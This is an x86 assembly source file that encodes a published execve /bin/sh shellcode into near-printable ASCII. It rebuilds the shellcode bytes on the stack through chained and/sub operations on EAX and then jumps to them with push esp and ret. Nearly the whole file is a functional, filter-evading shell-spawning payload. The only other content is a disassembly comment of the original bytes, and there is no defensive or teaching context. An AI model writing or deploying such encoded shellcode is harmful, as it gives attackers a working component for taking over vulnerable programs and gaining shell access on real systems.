; Original shellcode (Linux/x86 - Tiny Execve sh Shellcode - 21 bytes by Geyslan G. Bem): http://shell-storm.org/shellcode/files/shellcode-841.php

;  0:    31 c9                    xor    ecx, ecx
;  2:    f7 e1                    mul    ecx
;  4:    b0 0b                    mov    al, 0xb
;  6:    51                       push   ecx
;  7:    68 2f 2f 73 68           push   0x68732f2f
;  c:    68 2f 62 69 6e           push   0x6e69622f
; 11:    89 e3                    mov    ebx, esp
; 13:    cd 80                    int    0x80

; Final length 96 bytes
bits 32

;80cde389
and eax, 0x554e4d4a
and eax, 0x2a313235

sub eax, 0x2b3d2f24
sub eax, 0x27766f30
sub eax, 0x2c7e7e23

push eax

;6e69622f
push 0x6e69622f

;6868732f
push 0x6868732f

;2f68510b
and eax, 0x554e4d4a
and eax, 0x2a313235

sub eax, 0x3e40245f
sub eax, 0x22252a60
sub eax, 0x70326036

push eax

;b0e1f7c9
and eax, 0x554e4d4a
and eax, 0x2a313235

sub eax, 0x617e4741
sub eax, 0x6f244778
sub eax, 0x7e7b797e

push eax

;31414941
push 0x31414941

; jmp to shellcode (1 non-printable byte :( )
push esp
ret